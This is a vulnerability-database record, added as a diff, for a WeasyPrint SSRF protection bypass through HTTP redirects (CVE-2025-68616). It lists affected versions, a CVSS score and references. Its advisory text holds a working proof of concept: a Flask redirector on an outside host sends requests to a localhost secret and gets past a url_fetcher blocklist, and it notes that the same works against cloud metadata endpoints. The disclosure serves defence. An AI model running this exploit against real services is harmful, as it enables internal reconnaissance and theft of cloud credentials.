@@ -1,0 +1,230 @@
+advisory_id: GHSA-983w-rhvv-gwmv
+datasource_id: github_osv/GHSA-983w-rhvv-gwmv
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-983w-rhvv-gwmv/GHSA-983w-rhvv-gwmv.json
+aliases:
+  - CVE-2025-68616
+summary: "WeasyPrint has a Server-Side Request Forgery (SSRF) Protection Bypass via HTTP Redirect\n\
+  ### Summary\n\nA **Server-Side Request Forgery (SSRF) Protection Bypass** exists in WeasyPrint's\
+  \ `default_url_fetcher`. The vulnerability allows attackers to access internal network resources\
+  \ (such as `localhost` services or cloud metadata endpoints) even when a developer has implemented\
+  \ a custom `url_fetcher` to block such access. This occurs because the underlying `urllib`\
+  \ library follows HTTP redirects automatically without re-validating the new destination against\
+  \ the developer's security policy.\n\n### Details\n\nThe default URL fetching mechanism in\
+  \ WeasyPrint (default_url_fetcher in weasyprint/urls.py) is vulnerable to a Server-Side Request\
+  \ Forgery (SSRF) Protection Bypass.\n\nWhile WeasyPrint allows developers to define custom\
+  \ url_fetcher functions to validate or sanitize URLs before fetching (e.g., blocking internal\
+  \ IP addresses or specific ports), the underlying implementation uses Python's standard urllib.request.urlopen.\
+  \ By default, urllib automatically follows HTTP redirects (status codes 301, 302, 307, etc.)\
+  \ without returning control to the developer's validation logic for the new target URL.\n\n\
+  This behavior creates a Time-of-Check to Time-of-Use (TOCTOU) vulnerability. An attacker can\
+  \ provide a URL that passes the developer's allowlist/blocklist (the Check) but immediately\
+  \ redirects to a blocked internal resource (the Use).\n\n### PoC\n\nTo reproduce this vulnerability,\
+  \ use the following setup. This scenario simulates a developer attempting to blacklist access\
+  \ to internal hostnames (e.g., `localhost`).\n\n**1. victim.py (Internal Service - Port 5000)**\n\
+  Simulates a sensitive internal service running on localhost.\n\n```python\nfrom flask import\
+  \ Flask\napp = Flask(__name__)\n\n@app.route('/secret')\ndef secret():\n    return \"CRITICAL_INTERNAL_DATA\"\
+  \n\nif __name__ == '__main__':\n    # Listens on localhost:5000\n    app.run(port=5000)\n\
+  ```\n\n**2. attacker.py (External Redirector - Port 1337)**\nSimulates an external server.\
+  \ It accepts a request and redirects it to the blocked hostname (`localhost`).\n\n```python\n\
+  from flask import Flask, redirect\napp = Flask(__name__)\n\n@app.route('/image.png')\ndef\
+  \ malicious():\n    # The vulnerability: Redirects to the BLOCKED hostname\n    return redirect(\"\
+  http://localhost:5000/secret\", code=302)\n\nif __name__ == '__main__':\n    app.run(port=1337)\n\
+  ```\n\n**3. exploit.py (Vulnerable Implementation)**\nSimulates the application with a security\
+  \ filter intended to block access to \"localhost\".\n\n```python\nfrom weasyprint import HTML,\
+  \ default_url_fetcher\nimport logging\n\n# Security Filter: Intended to block internal hostnames\n\
+  def secure_fetcher(url):\n    # Simulates a blacklist for 'localhost'\n    if \"localhost\"\
+  \ in url:\n        raise PermissionError(f\"Security Block: Access to {url} denied.\")\n \
+  \   \n    print(f\"[ALLOWED] Initial URL check passed for: {url}\")\n    return default_url_fetcher(url)\n\
+  \n# EXPLOIT LOGIC:\n# 1. We access the attacker via '127.0.0.1' (or an external IP). \n# \
+  \   The string \"127.0.0.1\" passes the check because it is not \"localhost\".\n# 2. The attacker\
+  \ redirects to \"http://localhost:5000/...\".\n# 3. urllib follows the redirect to 'localhost'\
+  \ without re-triggering secure_fetcher.\n\ntry:\n    # Use 127.0.0.1 to bypass the string\
+  \ check for 'localhost'\n    html_content = '<link rel=\"attachment\" href=\"http://54.234.88.160:1337/image.png\"\
+  >'\n    \n    doc = HTML(string=html_content, url_fetcher=secure_fetcher)\n    doc.write_pdf(\"\
+  exploit.pdf\")\n    \n    print(\"Exploit successful. The 'localhost' block was bypassed via\
+  \ redirect.\")\n    print(\"Check exploit.pdf for 'CRITICAL_INTERNAL_DATA'.\")\nexcept Exception\
+  \ as e:\n    print(f\"Exploit failed: {e}\")\n```\n**4. Attacker read attachment in PDF**\n\
+  ```\n➜ pdfdetach -list resultado_exploit.pdf\n1 embedded files\n1: secret\n➜ pdfdetach -saveall\
+  \ resultado_exploit.pdf\n➜ cat secret\nCRITICAL_INTERNAL_DATA\n```\n**Evidence**\n<img width=\"\
+  1514\" height=\"436\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f7881694-be4d-4c63-8bca-2b220e4c87f9\"\
+  \ />\n\n### Impact\n\nThis vulnerability impacts any application or SaaS platform using WeasyPrint\
+  \ to render user-supplied HTML/CSS that attempts to restrict external resource loading.\n\n\
+  \  * **Internal Network Reconnaissance:** Attackers can bypass firewalls or allowlists to\
+  \ scan and access internal services (e.g., Redis, ElasticSearch, Admin Panels) running on\
+  \ the loopback interface or local network.\n  * **Cloud Metadata Exfiltration:** In cloud\
+  \ environments, attackers can redirect requests to metadata services (e.g., `http://169.254.169.254`)\
+  \ to steal instance credentials and escalate privileges.\n  * **Security Control Bypass:**\
+  \ It renders the `url_fetcher` security validation logic ineffective against sophisticated\
+  \ attacks, creating a false sense of security for developers."
+impacted_packages:
+  - purl: pkg:pypi/weasyprint
+    affected_versions: vers:pypi/<68.0
+    fixed_versions: vers:pypi/68.0
+    affected_packages:
+      - pkg:pypi/weasyprint@0.1
+      - pkg:pypi/weasyprint@0.2
+      - pkg:pypi/weasyprint@0.2.1
+      - pkg:pypi/weasyprint@0.2.2
+      - pkg:pypi/weasyprint@0.3
+      - pkg:pypi/weasyprint@0.3.1
+      - pkg:pypi/weasyprint@0.4
+      - pkg:pypi/weasyprint@0.5
+      - pkg:pypi/weasyprint@0.6
+      - pkg:pypi/weasyprint@0.6.1
+      - pkg:pypi/weasyprint@0.7
+      - pkg:pypi/weasyprint@0.7.1
+      - pkg:pypi/weasyprint@0.8
+      - pkg:pypi/weasyprint@0.9
+      - pkg:pypi/weasyprint@0.10
+      - pkg:pypi/weasyprint@0.11
+      - pkg:pypi/weasyprint@0.12
+      - pkg:pypi/weasyprint@0.13
+      - pkg:pypi/weasyprint@0.14
+      - pkg:pypi/weasyprint@0.15
+      - pkg:pypi/weasyprint@0.16
+      - pkg:pypi/weasyprint@0.17
+      - pkg:pypi/weasyprint@0.17.1
+      - pkg:pypi/weasyprint@0.18
+      - pkg:pypi/weasyprint@0.19
+      - pkg:pypi/weasyprint@0.19.1
+      - pkg:pypi/weasyprint@0.19.2
+      - pkg:pypi/weasyprint@0.20
+      - pkg:pypi/weasyprint@0.20.1
+      - pkg:pypi/weasyprint@0.20.2
+      - pkg:pypi/weasyprint@0.21
+      - pkg:pypi/weasyprint@0.22
+      - pkg:pypi/weasyprint@0.23
+      - pkg:pypi/weasyprint@0.24
+      - pkg:pypi/weasyprint@0.25
+      - pkg:pypi/weasyprint@0.26
+      - pkg:pypi/weasyprint@0.27
+      - pkg:pypi/weasyprint@0.28
+      - pkg:pypi/weasyprint@0.29
+      - pkg:pypi/weasyprint@0.30
+      - pkg:pypi/weasyprint@0.31
+      - pkg:pypi/weasyprint@0.32
+      - pkg:pypi/weasyprint@0.33
+      - pkg:pypi/weasyprint@0.34
+      - pkg:pypi/weasyprint@0.35
+      - pkg:pypi/weasyprint@0.36
+      - pkg:pypi/weasyprint@0.37
+      - pkg:pypi/weasyprint@0.38
+      - pkg:pypi/weasyprint@0.39
+      - pkg:pypi/weasyprint@0.40
+      - pkg:pypi/weasyprint@0.41
+      - pkg:pypi/weasyprint@0.42
+      - pkg:pypi/weasyprint@0.42.1
+      - pkg:pypi/weasyprint@0.42.2
+      - pkg:pypi/weasyprint@0.42.3
+      - pkg:pypi/weasyprint@43rc1
+      - pkg:pypi/weasyprint@43rc2
+      - pkg:pypi/weasyprint@43
+      - pkg:pypi/weasyprint@44
+      - pkg:pypi/weasyprint@45
+      - pkg:pypi/weasyprint@46
+      - pkg:pypi/weasyprint@47
+      - pkg:pypi/weasyprint@48
+      - pkg:pypi/weasyprint@49
+      - pkg:pypi/weasyprint@50
+      - pkg:pypi/weasyprint@51
+      - pkg:pypi/weasyprint@52
+      - pkg:pypi/weasyprint@52.1
+      - pkg:pypi/weasyprint@52.2
+      - pkg:pypi/weasyprint@52.3
+      - pkg:pypi/weasyprint@52.4
+      - pkg:pypi/weasyprint@52.5
+      - pkg:pypi/weasyprint@53.0b1
+      - pkg:pypi/weasyprint@53.0b2
+      - pkg:pypi/weasyprint@53.0
+      - pkg:pypi/weasyprint@53.1
+      - pkg:pypi/weasyprint@53.2
+      - pkg:pypi/weasyprint@53.3
+      - pkg:pypi/weasyprint@53.4
+      - pkg:pypi/weasyprint@54.0b1
+      - pkg:pypi/weasyprint@54.0
+      - pkg:pypi/weasyprint@54.1
+      - pkg:pypi/weasyprint@54.2
+      - pkg:pypi/weasyprint@54.3
+      - pkg:pypi/weasyprint@55.0b1
+      - pkg:pypi/weasyprint@55.0
+      - pkg:pypi/weasyprint@56.0b1
+      - pkg:pypi/weasyprint@56.0
+      - pkg:pypi/weasyprint@56.1
+      - pkg:pypi/weasyprint@57.0b1
+      - pkg:pypi/weasyprint@57.0
+      - pkg:pypi/weasyprint@57.1
+      - pkg:pypi/weasyprint@57.2
+      - pkg:pypi/weasyprint@58.0b1
+      - pkg:pypi/weasyprint@58.0
+      - pkg:pypi/weasyprint@58.1
+      - pkg:pypi/weasyprint@59.0b1
+      - pkg:pypi/weasyprint@59.0
+      - pkg:pypi/weasyprint@60.0
+      - pkg:pypi/weasyprint@60.1
+      - pkg:pypi/weasyprint@60.2
+      - pkg:pypi/weasyprint@61.0
+      - pkg:pypi/weasyprint@61.1
+      - pkg:pypi/weasyprint@61.2
+      - pkg:pypi/weasyprint@62.0
+      - pkg:pypi/weasyprint@62.1
+      - pkg:pypi/weasyprint@62.2
+      - pkg:pypi/weasyprint@62.3
+      - pkg:pypi/weasyprint@63.0
+      - pkg:pypi/weasyprint@63.1
+      - pkg:pypi/weasyprint@64.0
+      - pkg:pypi/weasyprint@64.1
+      - pkg:pypi/weasyprint@65.0
+      - pkg:pypi/weasyprint@65.1
+      - pkg:pypi/weasyprint@66.0
+      - pkg:pypi/weasyprint@67.0
+    fixed_packages:
+      - pkg:pypi/weasyprint@68.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/kozea/weasyprint
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/kozea/weasyprint
+        commit: b6a14f0f3f4ce9c0c75c1a2d73cb1c5d43f0e565
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-983w-rhvv-gwmv/GHSA-983w-rhvv-gwmv.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-601
+  - CWE-918
+references:
+  - url: https://bugzilla.redhat.com/show_bug.cgi?id=2430858
+    reference_type:
+    reference_id:
+  - url: https://github.com/Kozea/WeasyPrint
+    reference_type:
+    reference_id:
+  - url: https://github.com/Kozea/WeasyPrint/commit/b6a14f0f3f4ce9c0c75c1a2d73cb1c5d43f0e565
+    reference_type:
+    reference_id:
+  - url: https://access.redhat.com/security/cve/CVE-2025-68616
+    reference_type:
+    reference_id: CVE-2025-68616
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-68616
+    reference_type:
+    reference_id: CVE-2025-68616
+  - url: https://security.access.redhat.com/data/csaf/v2/vex/2025/cve-2025-68616.json
+    reference_type:
+    reference_id: CVE-2025-68616.JSON
+  - url: https://github.com/Kozea/WeasyPrint/security/advisories/GHSA-983w-rhvv-gwmv
+    reference_type:
+    reference_id: GHSA-983w-rhvv-gwmv
+exploits: []
